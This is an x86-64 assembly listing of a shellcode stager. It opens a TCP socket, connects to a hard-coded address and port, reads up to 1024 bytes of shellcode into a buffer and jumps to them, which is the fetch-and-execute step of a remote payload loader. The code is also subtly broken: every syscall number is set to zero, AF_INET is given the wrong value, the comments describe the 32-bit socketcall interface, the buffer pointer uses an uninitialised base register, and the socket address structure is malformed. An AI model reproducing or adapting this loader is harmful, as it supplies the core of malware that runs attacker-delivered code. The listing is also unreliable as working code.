global _start

section .text
_start:

    ; create socket
    xor rax, rax        ; socketcall() system call number
    mov rdi, 1          ; AF_INET for IPv4
    mov rsi, 1          ; SOCK_STREAM for TCP
    mov rdx, 0          ; protocol (default)
    syscall             ; create socket, return file descriptor in rax
    
    mov r8, rax         ; save file descriptor in r8
    
    ; connect to remote host
    xor rax, rax        ; socketcall() system call number
    mov rdi, r8         ; socket file descriptor
    mov rsi, sockaddr   ; pointer to sockaddr structure
    mov rdx, 16         ; length of sockaddr structure
    syscall             ; connect to remote host
    
    ; receive shellcode
    mov rdi, r8         ; socket file descriptor
    lea rsi, [rbp-1024] ; buffer to store received shellcode
    mov rdx, 1024       ; size of buffer
    xor rax, rax        ; recv() system call number
    syscall             ; receive shellcode
    
    ; execute shellcode
    jmp rsi             ; jump to shellcode

section .data
    sockaddr:
        db 0x02          ; AF_INET for IPv4
        dw 0x5C11        ; port number in network byte order
        dd 0x0100007F    ; IP address in network byte order (127.0.0.1)
        db 0             ; padding
